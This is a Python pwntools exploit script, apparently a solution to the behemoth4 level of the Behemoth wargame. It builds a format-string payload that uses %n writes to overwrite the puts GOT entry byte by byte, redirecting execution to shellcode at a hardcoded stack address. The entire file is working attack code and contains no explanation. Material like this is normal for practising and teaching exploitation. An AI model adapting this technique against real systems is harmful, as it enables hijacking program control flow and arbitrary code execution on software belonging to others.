from pwn import *
import sys

PATH = '/behemoth/behemoth4'

address_of_puts = 0x0804b218
address_of_shellcode = 0xffffd510

payload = b'JUNK' 
payload += p32(address_of_puts)
payload += b'JUNK' 
payload += p32(address_of_puts+1)
payload += b'JUNK' 
payload += p32(address_of_puts+2)
payload += b'JUNK' 
payload += p32(address_of_puts+3)

printed_chars = len(payload)
byte_to_insert = address_of_shellcode & 0xff
print(byte_to_insert)
res = byte_to_insert - printed_chars

print("res is:",res)
if res <= 0:
    while res <= 0:
        res += 0x100
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res
else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res 


byte_to_insert = (address_of_shellcode & (0xff << 8) ) >> 8
print(byte_to_insert)
res = byte_to_insert - printed_chars
print("res is:",res)
if res <= 0:
    while res <= 0:
        res += 0x100
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res
else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res


byte_to_insert = (address_of_shellcode & (0xff << 16) ) >> 16
print(byte_to_insert)
res = byte_to_insert - printed_chars
print("res is:",res)
if res <= 0:
    while res <= 0:
        res += 0x100
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res
else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res


byte_to_insert = (address_of_shellcode & (0xff << 24) ) >> 24
print(byte_to_insert)
res = byte_to_insert - printed_chars
print("res is:",res)
if res <= 0:
    while res <= 0:
        res += 0x100
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res

else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res


sys.stdout.buffer.write(payload)
